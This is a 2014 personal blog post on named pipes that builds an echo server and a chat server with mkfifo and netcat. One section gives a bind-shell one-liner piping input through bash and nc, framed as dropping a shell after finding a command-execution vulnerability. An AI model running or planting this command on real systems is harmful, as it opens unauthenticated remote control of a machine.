<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Fun with pipes · Vasuman</title>
        <link rel="stylesheet" href="/static/site.css" />
        <meta name="title" content="Fun with pipes · Vasuman" />
        <meta name="viewport" content="width=600" />
        <meta name="keywords" content="programming,tech,blog,gamedev" />
        <meta name="description" content="Personal website and blog of Vasuman Ravichandran" />
        <meta name="author" content="Vasuman Ravichandran" />
        <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-40829655-2', 'auto');
        ga('send', 'pageview');
        </script>
    </head>
    <body>
        <nav class="site-nav">
            <a href="/"><img class="nav-logo" src="/static/images/logo.png" /></a>
            <h1 class="site-title"> Personal website and blog of Vasuman Ravichandran </h1>
            <ul class="nav-links">
                <li><a class="nav-item" href="/posts.html">Posts</a></li>
                <li><a class="nav-item" href="/showcase.html">Showcase</a></li>
                <li><a class="nav-item" href="/about.html">About</a></li>
            </ul>
        </nav>
        <div class="content">
            <article class="post">
                <div class="post-header">
                    <h1> Fun with pipes </h1>
                    <time datetime="2014-10-06">6th Oct 2014 </time>
                </div>
                <div class="post-content">
                    <p>Quite a while back I came across some interesting applications of
<strong>named pipes</strong> that I thought I should share with everybody.</p>
<p>First, some background.</p>
<h2 id="pipes">Pipes</h2>
<p>Commonly, pipes are used in the shell to redirect the <code>stdout</code> of one
process to the <code>stdin</code> of another, you simply</p>
<pre><code class="lang-sh">$ cat myfile | grep sometext
</code></pre>
<h2 id="named-pipes">Named pipes</h2>
<p>Since <code>|</code> pipes are anonymous, they cannot be referenced externally.
Named pipes on the other hand have an accesible path in the
filesystem.</p>
<pre><code class="lang-sh">$ mkfifo /tmp/mypipe
</code></pre>
<p>These pipes allow us to setup flows across different shell commands.
Data can be pumped in by one command and fed to another command. Like,</p>
<pre><code class="lang-sh">$ cat /tmp/mypipe
</code></pre>
<p>This command blocks till the named pipe spews and <code>EOF</code> marker.</p>
<p>And in another shell,</p>
<pre><code class="lang-sh">$ cat &gt; /tmp/mypipe
</code></pre>
<p>Now, whatever you type in the this shell should be visible in the
other shell. Press <kbd>Ctrl-D</kbd> to exit.</p>
<p>Named pipes are primarily used as IPC mechanisms along with UNIX
sockets.</p>
<p>Now let’s get down to some interesting stuff. These pipes are
of interest to me because they allow us to set up a very special kind
of circular reference. That is, <em>they allow a command’s own output to
be part of it’s input!</em>.</p>
<h2 id="echo-server">Echo Server</h2>
<p>Let’s start of with something simple, an <strong>echo server</strong>. The
principle is to simply <em>echo</em> the input of the user. As have probably
noticed, this falls directly into the category of problems the
circular reference property of named pipes solves – the input is the
output.</p>
<p>The <a href="http://sectools.org/tool/netcat/">netcat</a> utility helps us setup
a simple listening socket that can be communicated with using <code>stdin</code>
and <code>stdout</code>.</p>
<pre><code class="lang-sh">$ cat /tmp/mypipe | nc -l 59000 &gt; /tmp/mypipe
</code></pre>
<p>Simply <code>cat</code>ing the contents of a pipe to the input of the <code>nc</code>
command with the <code>-l</code> option that sets up a port to listen on and
write any incoming data to the same pipe so that it’s echoed
back. Then,</p>
<pre><code class="lang-sh">$ nc &lt;network-address&gt; 59000
</code></pre>
<p>There you have it, an <em>echo server in one line of bash</em></p>
<h2 id="remote-shell">Remote Shell</h2>
<p>Suppose, you have discovered a vulnerability in some service that
allows you to execute a single command on the shell. Now you want to
drop a shell on that box. For something serious, you’re probably
better of using
<a href="http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Basics">Meterpreter</a>
but this is for cases where you just need a simple, quick and dirty
hack!</p>
<p>Like the earlier snippet we set up a circular input path. The only
difference being we pipe the user input through the bash interpreter
that executes <code>stdin</code> and pipe it’s <code>stdout</code> back to the network socket.</p>
<pre><code class="lang-sh">$ cat /tmp/mypipe | bash | nc -l 59000 &gt; /tmp/mypipe
</code></pre>
<p>Just connect to that port and you should have a working remote shell.</p>
<h2 id="chat-server">Chat Server</h2>
<p>A chat server is another application that falls into the same problem
domain. It recieves some input and simply relays that input to all
connected users. It can be thought of as an echo server with multiple
concurrent nodes.</p>
<p>Sadly though, the netcat utility only allows only a single active
connection. Luckily, there’s <a href="http://nmap.org/ncat/">this</a> rewrite of
the netcat tool that allows us to accept multiple incoming connections
simultaneously.</p>
<pre><code class="lang-sh">$ cat /tmp/mypipe | ncat -l -k 59000 &gt; /tmp/mypipe
</code></pre>
<p>Now multiple hosts can connect to that port and exchange messages with
each other.</p>

                </div>
            </article>
        </div>
        <footer class="site-footer">
            <a class="contact-link" href="mailto:varav@varav.in">Contact</a>
            <div class="credits"> Forged by <a href="http://metalsmith.io">Metalsmith</a> </div>
        </footer>
    </body>
</html>
